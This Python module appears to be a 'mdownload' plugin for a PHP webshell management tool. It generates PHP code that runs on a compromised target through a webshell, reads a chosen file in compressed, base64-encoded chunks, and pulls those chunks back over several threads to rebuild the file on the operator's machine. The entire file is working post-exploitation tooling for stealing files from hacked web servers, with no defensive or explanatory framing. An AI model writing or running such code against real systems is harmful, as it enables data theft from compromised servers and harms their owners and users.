from os import path, makedirs
from re import match, sub
from base64 import b64decode
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from tqdm import tqdm

from libs.config import alias, color, gget
from libs.myapp import send, base64_encode, gzinflate, size_to_human, human_to_size


DOWNLOAD_SUCCESS = True
LOCK = Lock()


def get_data_php(web_file_path: str, offset: int, blocksize: int):
    return """function download($file, $offset, $size)
{
    $fp = @fopen($file,'rb');
    if ($fp){
        fseek($fp, $offset);
        echo base64_encode(gzdeflate(fread($fp, $size)));
    }
}
download(base64_decode("%s"), %s, %s);
""" % (base64_encode(web_file_path), offset, blocksize)

def get_filesize_php(web_file_path: str):
    return """echo filesize(base64_decode("%s"));
""" % ( base64_encode(web_file_path))


def get_data(web_file_path: str, n: int, offset: int, blocksize: int):
    global DOWNLOAD_SUCCESS
    retry_time = 5
    res = None
    content = b''
    while retry_time and not content:
        res = send(get_data_php(web_file_path, offset, blocksize))
        retry_time -= 1
        try:
            content = res.r_content.strip()
        except Exception:
            content = b''
            DOWNLOAD_SUCCESS = False
    return (n, content)


@alias(True, _type="FILE", w="web_file_path", l="local_path", s="humansize", t="threads")
def run(
    web_file_path: str, local_path: str = "", humansize: str = "1MB", threads: int = 5
) -> bool:
    """
    mdownload

    Download file from target system by block compression and multi threads.

    eg: mdownload {web_file_path} {local_path=doughnuts/target/site.com/...} {humansize="1MB",eg="10MB"} {threads=5}
    """
    global LOCK, DOWNLOAD_SUCCESS
    res = send(get_filesize_php(web_file_path))
    if (not res):
        return
    try:
        file_size = int(res.r_text.strip())
    except ValueError:
        file_size = 0
    try:
        blocksize = human_to_size(humansize)
    except Exception:
        blocksize = file_size // 10
        print(color.yellow(f"[Warn] Parse humansize error, set it to {size_to_human(blocksize)}"))
    if (blocksize < file_size / 1000):
        blocksize = file_size // 100
        print(color.yellow(f"[Warn] Humansize too small, set it to {size_to_human(blocksize)}"))
    file_human_size = color.green(size_to_human(file_size))
    if (file_size):
        download_path = local_path or gget("webshell.download_path", "webshell")
        file_path = path.join(download_path, path.split(web_file_path)[1]).replace("\\", "/")
        content_length = 0
        chunk_dict = {}
        with ThreadPoolExecutor(max_workers=threads) as tp, tqdm(total=file_size, desc="Downloading", unit_scale=True) as bar:
            all_task = [tp.submit(get_data, web_file_path, n, offset, blocksize) for n, offset in enumerate(range(0, file_size, blocksize))]
            for future in as_completed(all_task):
                n, chunk = future.result()
                if (chunk):
                    chunk_dict[n] = chunk
                    with LOCK:
                        content_length += blocksize
                        bar.update(blocksize)
                else:
                    DOWNLOAD_SUCCESS = False
                    break
            if (not DOWNLOAD_SUCCESS):
                for task in reversed(all_task):
                    task.cancel()
                bar.close()
                return
        with open(file_path, "wb") as fp, tqdm(total=file_size, desc="Decompressing", unit_scale=True) as bar:
            for i in range(len(all_task)):
                content = gzinflate(b64decode(chunk_dict[i]))
                fp.write(content)
                fp.flush()
                bar.update(blocksize)
        print(color.green(f"\nDownloaded file has been saved to {file_path}\n"))
    else:
        print(color.red("\nFile not exist / Download error\n"))
        return ''
